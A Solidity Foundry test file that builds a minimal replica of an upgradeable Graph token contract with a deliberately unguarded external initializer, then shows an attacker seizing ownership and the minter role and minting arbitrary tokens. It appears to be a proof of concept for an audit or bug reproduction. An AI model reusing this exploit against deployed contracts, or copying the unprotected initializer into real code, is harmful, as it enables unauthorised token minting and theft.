// Minimal vulnerable replica (inline — do NOT import from ../src/)
contract GraphTokenUpgradeable {
    // only the state + functions your exploit touches
    address public owner;
    mapping(address => bool) private _minters;
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    event MinterAdded(address indexed account);

    function isMinter(address _account) public view returns (bool) {
        return _minters[_account];
    }

    // Vulnerable initializer: missing initializer guard and exposed as external
    function _initialize(address _owner, uint256 _initialSupply) external {
        // set governor/owner
        owner = _owner;

        // mint initial supply to owner
        totalSupply += _initialSupply;
        balanceOf[_owner] += _initialSupply;

        // make owner a minter
        _addMinter(_owner);
    }

    function _addMinter(address _account) private {
        _minters[_account] = true;
        emit MinterAdded(_account);
    }

    // simple mint protected by minter role
    function mint(address _to, uint256 _amount) external {
        require(_minters[msg.sender], "Only minter");
        totalSupply += _amount;
        balanceOf[_to] += _amount;
    }
}

contract GraphTokenUpgradeableTest is Test {
    GraphTokenUpgradeable target;
    address attacker;

    function setUp() public {
        target = new GraphTokenUpgradeable();
        attacker = makeAddr("attacker");
    }

    function test_attacker_exploits__initialize() public {
        // Attacker calls the initializer (should be protected but isn't)
        vm.prank(attacker);
        target._initialize(attacker, 1000);

        // Attacker became owner/governor and minter
        assertEq(target.owner(), attacker);
        assertTrue(target.isMinter(attacker));

        // Attacker can now mint arbitrary tokens
        vm.prank(attacker);
        target.mint(attacker, 5000);
        assertEq(target.balanceOf(attacker), 6000);
    }
}

